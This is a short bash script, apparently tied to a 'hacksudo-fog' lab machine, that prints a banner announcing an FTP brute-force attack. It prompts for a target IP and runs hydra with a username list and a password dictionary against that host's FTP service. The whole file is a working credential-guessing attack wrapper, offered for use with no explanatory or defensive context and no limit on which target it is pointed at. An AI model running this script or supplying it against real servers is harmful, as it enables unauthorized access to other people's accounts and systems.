#!/bin/bash
apt install figlet
figlet hacksudo-fog
echo "FTP Bruetfoce attack"
echo "www.hacksudo.com"
echo "enter your target ip:"
read ans
export user=user.txt
export pass=dict.lst
hydra -L $user -P $pass $ans ftp

